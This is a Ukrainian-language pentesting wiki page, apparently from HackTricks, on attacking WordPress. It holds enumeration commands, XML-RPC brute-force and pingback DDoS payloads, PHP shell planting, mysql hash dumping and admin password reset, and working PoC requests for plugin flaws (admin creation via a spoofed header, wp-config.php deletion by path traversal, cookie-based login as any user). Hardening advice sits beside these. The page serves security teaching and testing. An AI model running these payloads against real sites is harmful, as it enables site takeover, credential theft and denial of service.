# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Базова інформація

- **Завантажені** файли потрапляють у: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Файли тем можна знайти в /wp-content/themes/,** тож якщо ви зміните якийсь php файлу теми, щоб отримати RCE, ймовірно ви будете використовувати цей шлях. Наприклад: Використовуючи **theme twentytwelve** ви можете отримати доступ до файлу **404.php** за адресою: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- У **wp-config.php** можна знайти root-пароль бази даних.
- Типові шляхи для входу, які варто перевірити: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` містить корисну інформацію, таку як версія встановленого WordPress.
- `wp-activate.php` використовується для процесу активації через email при налаштуванні нового сайту WordPress.
- Папки для входу (можуть бути перейменовані, щоб приховати):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` — це файл, який реалізує функціональність WordPress для передавання даних через HTTP як транспорт та XML як механізм кодування. Такий тип взаємодії було замінено WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Папка `wp-content` — основний каталог, де зберігаються плагіни та теми.
- `wp-content/uploads/` — каталог, де зберігаються всі файли, завантажені на платформу.
- `wp-includes/` — каталог, де зберігаються core-файли, такі як сертифікати, шрифти, файли JavaScript та віджети.
- `wp-sitemap.xml` У версіях WordPress 5.5 і вище WordPress генерує sitemap XML з усіма публічними записами та публічно запитуваними типами записів і таксономіями.

**Пост-експлуатація**

- Файл `wp-config.php` містить інформацію, необхідну WordPress для підключення до бази даних, таку як назва бази даних, хост бази даних, ім'я користувача і пароль, authentication keys і salts, а також префікс таблиць бази даних. Цей конфігураційний файл також можна використати для активації DEBUG-режиму, який може бути корисним при усуненні несправностей.

### Дозволи користувачів

- **Адміністратор**
- **Редактор**: Публікує та керує своїми й чужими записами
- **Автор**: Публікує та керує власними записами
- **Дописувач**: Пише і керує своїми записами, але не може їх публікувати
- **Підписник**: Переглядає пости та редагує свій профіль

## **Пасивна енумерація**

### **Отримати версію WordPress**

Перевірте, чи можна знайти файли `/license.txt` або `/readme.html`

У **коді сторінки** (приклад з [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link файли

![](<../../images/image (533).png>)

- JavaScript файли

![](<../../images/image (524).png>)

### Отримати плагіни
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Отримати теми
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Отримання версій загалом
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

Ймовірно, ви не зможете знайти всі можливі Plugins і Themes. Щоб виявити їх усі, вам потрібно буде **actively Brute Force a list of Plugins and Themes** (на щастя для нас, існують автоматизовані інструменти, які містять ці списки).

### Користувачі

- **ID Brute:** Ви отримуєте валідних користувачів з сайту WordPress шляхом Brute Forcing user IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Якщо відповіді — **200** або **30X**, це означає, що id є **дійсним**. Якщо відповідь — **400**, то id є **недійсним**.

- **wp-json:** Також можна спробувати отримати інформацію про користувачів, виконуючи запит:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Ще один ендпоїнт `/wp-json/`, який може розкрити деяку інформацію про користувачів, це:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Зверніть увагу, що ця кінцева точка повертає лише користувачів, які опублікували пост. **Інформація надається лише про користувачів, у яких ця функція увімкнена**.

Також зауважте, що **/wp-json/wp/v2/pages** може leak IP-адреси.

- **Login username enumeration**: Під час входу через **`/wp-login.php`** **повідомлення** є **різним** — воно вказує, чи існує зазначений **username** чи ні.

### XML-RPC

Якщо `xml-rpc.php` активний, ви можете виконати credentials brute-force або використати його для запуску DoS атак на інші ресурси. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Щоб перевірити, чи активний, спробуйте звернутися до _**/xmlrpc.php**_ і відправити цей запит:

**Перевірити**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Облікові дані Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** або **`metaWeblog.getUsersBlogs`** — це деякі методи, які можна використати для brute-force облікових даних. Якщо ви знайдете будь-який з них, ви можете надіслати щось на кшталт:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Повідомлення _"Incorrect username or password"_ у відповіді з кодом 200 повинно з'являтися, якщо облікові дані недійсні.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Використовуючи правильні облікові дані, ви можете завантажити файл. У відповіді з'явиться шлях ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Також є **швидший спосіб** перебору облікових даних за допомогою **`system.multicall`**, оскільки можна спробувати кілька облікових даних в одному запиті:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Цей метод призначений для програм, а не для людей, і є застарілим, тому не підтримує 2FA. Отже, якщо у вас є валідні облікові дані, але основний вхід захищений 2FA, **ви можете зловживати xmlrpc.php для входу з цими обліковими даними, оминаючи 2FA**. Зверніть увагу, що ви не зможете виконати всі дії, які доступні через консоль, але все ще можете отримати RCE, як пояснює Ippsec у [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Якщо ви знайдете метод _**pingback.ping**_ у списку, ви можете змусити Wordpress відправити довільний запит на будь-який хост/порт.\
Це можна використати, щоб попросити **тисячі** Wordpress **сайтів** звернутися до однієї **локації** (внаслідок чого там виникне **DDoS**) або застосувати це, щоб змусити **Wordpress** сканувати внутрішню **мережу** (можна вказати будь-який порт).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Якщо ви отримаєте **faultCode** зі значенням **більшим** за **0** (17), це означає, що порт відкритий.

Погляньте на використання **`system.multicall`** в попередньому розділі, щоб дізнатися, як зловживати цим методом для спричинення DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Цей файл зазвичай знаходиться в корені сайту Wordpress: **`/wp-cron.php`**\
При зверненні до цього файлу виконується **важкий** MySQL **запит**, тому він може бути використаний зловмисниками для спричинення **DoS**.\
До того ж, за замовчуванням, `wp-cron.php` викликається при кожному завантаженні сторінки (коли клієнт запитує будь-яку сторінку Wordpress), що на сайтах з високим трафіком може спричинити проблеми (DoS).

Рекомендується відключити Wp-Cron і створити реальний cronjob на хості, який виконуватиме необхідні дії через регулярні інтервали (без створення проблем).

### /wp-json/oembed/1.0/proxy - SSRF

Спробуйте звернутися до _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ і сайт Wordpress може зробити запит до вас.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Цей інструмент перевіряє, чи існує **methodName: pingback.ping** і шлях **/wp-json/oembed/1.0/proxy**, і якщо вони існують, намагається їх експлуатувати.

## Автоматичні інструменти
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Отримати доступ, перезаписавши біт

Більше схоже на цікавинку, ніж на реальну атаку. У CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) можна було перевернути 1 біт у будь-якому wordpress файлі. Тому можна було змінити біт на позиції `5389` у файлі `/var/www/html/wp-includes/user.php`, щоб замінити операцію NOT (`!`) на NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Панель RCE**

**Зміна php-файлу теми, що використовується (admin credentials needed)**

Зовнішній вигляд → Редактор тем → 404 Template (праворуч)

Змініть вміст на php shell:

![](<../../images/image (384).png>)

Пошукайте в інтернеті, як отримати доступ до оновленої сторінки. У цьому випадку потрібно перейти за адресою: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Можна використати:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
щоб отримати сесію.

## Плагін RCE

### PHP плагін

Може бути можливо завантажити .php файли як плагін.\
Створіть ваш php backdoor, наприклад:

![](<../../images/image (183).png>)

Потім додайте новий плагін:

![](<../../images/image (722).png>)

Завантажте плагін і натисніть Install Now:

![](<../../images/image (249).png>)

Натисніть на Procced:

![](<../../images/image (70).png>)

Ймовірно, це нічого не покаже, але якщо перейти в Media, ви побачите завантажений shell:

![](<../../images/image (462).png>)

Відкривши його, ви побачите URL для виконання reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Цей метод передбачає встановлення шкідливого плагіна, відомого своєю вразливістю, який можна експлуатувати для отримання web shell. Цей процес виконується через WordPress dashboard таким чином:

1. **Отримання плагіна**: плагін отримується з джерела, наприклад Exploit DB, як [**here**](https://www.exploit-db.com/exploits/36374).
2. **Встановлення плагіна**:
- Перейдіть до WordPress dashboard, потім в `Dashboard > Plugins > Upload Plugin`.
- Завантажте zip-файл завантаженого плагіна.
3. **Активація плагіна**: Після успішного встановлення плагін потрібно активувати через dashboard.
4. **Експлуатація**:
- Після встановлення та активації плагін "reflex-gallery" можна експлуатувати, оскільки він відомий своєю вразливістю.
- Metasploit framework надає експлойт для цієї вразливості. Завантаживши відповідний модуль та виконавши певні команди, можна встановити meterpreter сесію, що надасть несанкціонований доступ до сайту.
- Зауважте, що це лише один із багатьох методів експлуатації WordPress сайту.

У матеріалі присутні зображення, що показують кроки в WordPress dashboard для встановлення та активації плагіна. Однак важливо зазначити, що експлуатація вразливостей таким чином є незаконною та неетичною без належного дозволу. Цю інформацію слід використовувати відповідально і лише в правовому контексті, наприклад, під час penetration testing із явним дозволом.

**Для більш детальних кроків перегляньте:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Від XSS до RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ — скрипт, призначений ескалації уразливості **Cross-Site Scripting (XSS)** до **Remote Code Execution (RCE)** або інших критичних вразливостей у WordPress. Для додаткової інформації див. [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Він **підтримує Wordpress версії 6.X.X, 5.X.X та 4.X.X і дозволяє:**
- _**Privilege Escalation:**_ Створює користувача в WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Завантажити ваш власний плагін (backdoor) у WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Редагувати вбудовані плагіни у WordPress.
- _**(RCE) Built-In Theme Edit:**_ Редагувати вбудовані теми у WordPress.
- _**(Custom) Custom Exploits:**_ Користувацькі експлойти для плагінів/тем сторонніх розробників WordPress.

## Post Exploitation

Витягти імена користувачів та паролі:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Змінити пароль адміністратора:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Поверхня атаки

Знання того, як Wordpress плагін може відкривати функціональність, є ключовим для знаходження вразливостей у цій функціональності. Ви можете дізнатися, як плагін може відкривати функціональність у наведених нижче пунктах та знайти приклади вразливих плагінів в [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Один зі способів, яким плагін може відкривати функції для користувачів — через AJAX handlers. Вони можуть містити помилки в логіці, authorization або authentication. Більше того, часто ці функції базуватимуть як authentication, так і authorization на існуванні wordpress nonce, який **будь-який користувач, автентифікований в екземплярі Wordpress, може мати** (незалежно від ролі).

Це функції, які можна використовувати для відкриття функції в плагіні:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Використання `nopriv` робить endpoint доступним для будь-яких користувачів (навіть неаутентифікованих).**

> [!CAUTION]
> Крім того, якщо функція лише перевіряє авторизацію користувача за допомогою функції `wp_verify_nonce`, ця функція лише перевіряє, що користувач увійшов у систему, вона зазвичай не перевіряє роль користувача. Тому користувачі з низькими привілеями можуть мати доступ до дій з високими привілеями.

- **REST API**

It's also possible to expose functions from wordpress registering a rest AP using the `register_rest_route` function:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` — callback-функція, яка перевіряє, чи уповноважений певний користувач викликати метод API.

**Якщо використовується вбудована функція `__return_true`, вона просто пропустить перевірку прав користувача.**

- **Прямий доступ до php-файлу**

Звісно, Wordpress використовує PHP, і файли всередині плагінів безпосередньо доступні з вебу. Тому, якщо плагін відкриває будь-яку вразливу функціональність, яка запускається просто при доступі до файлу, її зможе експлуатувати будь-який користувач.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Деякі плагіни реалізують «trusted header» скорочення для внутрішніх інтеграцій або reverse proxy і потім використовують цей header для встановлення поточного контексту користувача для REST-запитів. Якщо header не прив'язаний криптографічно до запиту на upstream-компоненті, зловмисник може спуфити його й звертатися до привілейованих REST маршрутів як адміністратор.

- Impact: неавторизоване підвищення привілеїв до admin шляхом створення нового адміністратора через core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (примушує user ID 1, зазвичай перший обліковий запис адміністратора).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Чому це працює

- Плагін відображає header, контрольований клієнтом, на стан автентифікації і пропускає перевірки capability.
- WordPress core очікує здатність `create_users` для цього маршруту; хак плагіна обходить її, безпосередньо встановлюючи контекст поточного користувача з заголовка.

Очікувані ознаки успіху

- HTTP 201 з JSON-тілом, що описує створеного користувача.
- Новий адміністратор помітний у `wp-admin/users.php`.

Чекліст виявлення

- Grep для `getallheaders()`, `$_SERVER['HTTP_...']`, або vendor SDKs, які читають кастомні заголовки щоб встановити контекст користувача (наприклад, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Перегляньте реєстрації REST на предмет привілейованих callback-ів, які не мають надійних перевірок `permission_callback` і замість цього покладаються на заголовки запиту.
- Шукайте використання core-функцій управління користувачами (`wp_insert_user`, `wp_create_user`) всередині REST-обробників, які є обмеженими тільки значеннями заголовків.

Посилення безпеки

- Ніколи не виводьте автентифікацію або авторизацію з заголовків, контрольованих клієнтом.
- Якщо reverse proxy має інжектувати ідентичність, припиніть довіру на проксі та видаліть вхідні копії (наприклад, `unset X-Wcpay-Platform-Checkout-User` на межі), потім передавайте підписаний токен і валідуйте його на сервері.
- Для REST-маршрутів, що виконують привілейовані дії, вимагаються перевірки `current_user_can()` і строгий `permission_callback` (НЕ використовуйте `__return_true`).
- Віддавайте перевагу першокласній автентифікації (cookies, application passwords, OAuth) замість імперсонації через заголовки.

References: see the links at the end of this page for a public case and broader analysis.

### Неавторизоване довільне видалення файлів через wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Проблеми, викликані цим фрагментом:

* **Неавтентифікований доступ** – зареєстровано хук `wp_ajax_nopriv_`.
* **Відсутня перевірка nonce / capability** – будь-який відвідувач може звернутися до endpoint.
* **Немає санітизації шляху** – рядок під контролем користувача `fontfamily` конкатенується з файловим шляхом без фільтрації, що дозволяє класичний `../../` traversal.

#### Exploitation

Зловмисник може видалити будь-який файл або каталог **нижче базового каталогу uploads** (зазвичай `<wp-root>/wp-content/uploads/`) відправивши один HTTP POST-запит:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Оскільки `wp-config.php` знаходиться за межами *uploads*, на типовій інсталяції достатньо чотирьох послідовностей `../`. Видалення `wp-config.php` переведе WordPress при наступному відвідуванні в *майстер встановлення*, що дозволяє повне захоплення сайту (атакуючий лише надає нову конфігурацію бази даних і створює обліковий запис адміністратора).

Інші значущі цілі включають файли плагінів/тем `.php` (щоб порушити роботу плагінів безпеки) або правила `.htaccess`.

#### Detection checklist

* Будь-який callback `add_action( 'wp_ajax_nopriv_...')`, який викликає файлові хелпери (`copy()`, `unlink()`, `$wp_filesystem->delete()`, тощо).
* Конкатенація неналежно очищених даних користувача в шляхи (шукайте `$_POST`, `$_GET`, `$_REQUEST`).
* Відсутність `check_ajax_referer()` та `current_user_can()`/`is_user_logged_in()`.

#### Посилення безпеки
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Завжди** вважайте будь-яку операцію запису/видалення на диску привілейованою та двічі перевіряйте:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Багато плагінів реалізують функцію "view as role" або тимчасову зміну ролі, зберігаючи оригінальні роль(і) в user meta, щоб пізніше їх відновити. Якщо шлях відновлення покладається лише на параметри запиту (наприклад, `$_REQUEST['reset-for']`) і на список, який підтримує плагін, без перевірки capabilities і валідного nonce, це стає vertical privilege escalation.

Реальний приклад було знайдено у плагіні Admin and Site Enhancements (ASE) (≤ 7.6.2.1). Гілка reset відновлювала ролі на основі `reset-for=<username>` якщо ім'я користувача з'являлося у внутрішньому масиві `$options['viewing_admin_as_role_are']`, але не виконувала ні перевірки `current_user_can()`, ні верифікації nonce перед видаленням поточних ролей і повторним додаванням збережених ролей з user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Чому це можна експлуатувати

- Довіряє `$_REQUEST['reset-for']` та опції плагіна без авторизації на стороні сервера.
- Якщо користувач раніше мав вищі привілеї, збережені в `_asenha_view_admin_as_original_roles`, і був понижений, він може відновити їх, звернувшись до шляху скидання.
- У деяких розгортаннях будь-який автентифікований користувач міг би ініціювати скидання для іншого імені користувача, яке все ще присутнє в `viewing_admin_as_role_are` (пошкоджена авторизація).

Attack prerequisites

- Вразлива версія плагіна з увімкненою функцією.
- Цільовий акаунт має застарілу роль з високими привілеями, збережену в user meta від попереднього використання.
- Будь-яка автентифікована сесія; відсутній nonce/capability у потоці скидання.

Експлуатація (приклад)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
На вразливих збірках це видаляє поточні ролі та повторно додає збережені «original roles» (наприклад, `administrator`), фактично підвищуючи привілеї.

Detection checklist

- Шукайте функції перемикання ролей, що зберігають «original roles» в user meta (e.g., `_asenha_view_admin_as_original_roles`).
- Визначте шляхи скидання/відновлення, які:
- Читають імена користувачів з `$_REQUEST` / `$_GET` / `$_POST`.
- Змінюють ролі за допомогою `add_role()` / `remove_role()` без `current_user_can()` і `wp_verify_nonce()` / `check_admin_referer()`.
- Авторизують на основі масиву опцій плагіна (e.g., `viewing_admin_as_role_are`) замість можливостей актора.

Hardening

- Примусово перевіряйте можливості в кожному блоці, що змінює стан (e.g., `current_user_can('manage_options')` or stricter).
- Вимагайте nonces для всіх змін ролей/дозволів та перевіряйте їх: `check_admin_referer()` / `wp_verify_nonce()`.
- Ніколи не довіряйте іменам користувачів, отриманим із запиту; визначайте цільового користувача на сервері на основі автентифікованого актора та чіткої політики.
- Анулюйте стан «original roles» при оновленнях профілю/ролей, щоб уникнути відновлення застарілих високих привілеїв:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Розгляньте зберігання мінімального стану та використання часово-обмежених токенів із перевіркою capability для тимчасових переключень ролей.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Деякі плагіни прив'язують хелпери для перемикання користувачів до публічного хуку `init` і визначають ідентичність зі значення cookie, що контролюється клієнтом. Якщо код викликає `wp_set_auth_cookie()` без перевірки автентифікації, capability та дійсного nonce, будь-який неавторизований відвідувач може примусово увійти під довільним користувачем.

Типовий вразливий шаблон (спрощено з Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Чому це вразливе

- Публічний хук `init` робить обробник доступним для неавторизованих користувачів (немає захисту `is_user_logged_in()`).
- Ідентичність походить із cookie, яке можна змінити на клієнті (`original_user_id`).
- Прямий виклик `wp_set_auth_cookie($uid)` залогінює запитувача як цього користувача без перевірок capability/nonce.

Експлуатація (без автентифікації)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Загальні edge/server WAFs налаштовані на широкі патерни (SQLi, XSS, LFI). Багато вразливостей високого впливу в WordPress/plugin — це специфічні для додатка logic/auth bugs, які виглядають як безпечний трафік, якщо движок не розуміє маршрути WordPress і семантику плагінів.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Don’t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Переконайтесь, що WordPress, plugins, і themes оновлені до останніх версій. Також підтвердіть, що automated updating увімкнено в wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Також, **встановлюйте лише надійні плагіни та теми WordPress**.

### Security Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Інші рекомендації**

- Видаліть стандартного користувача **admin**
- Використовуйте **надійні паролі** та **2FA**
- Періодично **переглядайте** **права доступу** користувачів
- Обмежте **кількість спроб входу**, щоб запобігти Brute Force атакам
- Перейменуйте файл **`wp-admin.php`** і дозволяйте доступ лише з внутрішньої мережі або з певних IP-адрес.


### Неаутентифікована SQL Injection через недостатню валідацію (WP Job Portal <= 2.3.2)

Плагін WP Job Portal для рекрутингу відкрив задачу **savecategory**, яка врешті-решт виконує наступний вразливий код у `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Проблеми, викликані цим фрагментом:

1. **Неочищений користувацький ввід** – `parentid` береться безпосередньо з HTTP-запиту.
2. **Конкатенація рядків у WHERE-клаузі** – немає `is_numeric()` / `esc_sql()` / prepared statement.
3. **Доступ без аутентифікації** – хоча дія виконується через `admin-post.php`, єдина перевірка — **CSRF nonce** (`wp_verify_nonce()`), який будь-який відвідувач може отримати зі сторінки, що вбудовує шорткод `[wpjobportal_my_resumes]`.

#### Експлуатація

1. Отримати свіжий nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
